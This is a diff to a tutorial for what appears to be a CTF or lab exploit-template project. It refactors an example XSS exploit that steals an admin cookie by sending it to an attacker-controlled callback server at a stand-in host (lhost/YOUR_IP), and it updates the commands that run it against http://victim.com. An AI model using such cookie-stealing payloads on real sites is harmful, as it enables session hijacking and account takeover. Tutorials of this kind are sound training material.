@@ -52,8 +52,12 @@ Edit ``src/your_project/exploit.py``:
    from your_project.utils.server_hooks import get_cookie
    from your_project.utils.cookie import parse_cookie_string
 
-   def main(target_url, lhost, lport):
+   def run(args):
        """Exploit XSS to steal admin cookie"""
+
+       target_url = args.target
+       lhost = args.lhost
+       lport = args.lport
 
        # Generate XSS payload
        payload = cookie_stealer(f"http://{lhost}:{lport}")
@@ -82,30 +86,20 @@ Edit ``src/your_project/exploit.py``:
        else:
            out.error("No callback received")
 
-   if __name__ == "__main__":
-       import argparse
-       parser = argparse.ArgumentParser()
-       parser.add_argument("--target", default="http://target.local")
-       parser.add_argument("--lhost", required=True)
-       parser.add_argument("--lport", default=8000, type=int)
-       args = parser.parse_args()
-
-       main(args.target, args.lhost, args.lport)
-
 Run Your Exploit
 ----------------
 
-In one terminal, start the HTTP callback server:
+First, start the HTTP callback server in one terminal:
 
 .. code-block:: bash
 
    uv run your_project --server
 
-In another terminal, run your exploit:
+Then in another terminal, run your exploit:
 
 .. code-block:: bash
 
-   python src/your_project/exploit.py --lhost YOUR_IP --target http://victim.com
+   uv run your_project --target http://victim.com --lhost YOUR_IP --lport 8000
 
 Common Patterns
 ---------------
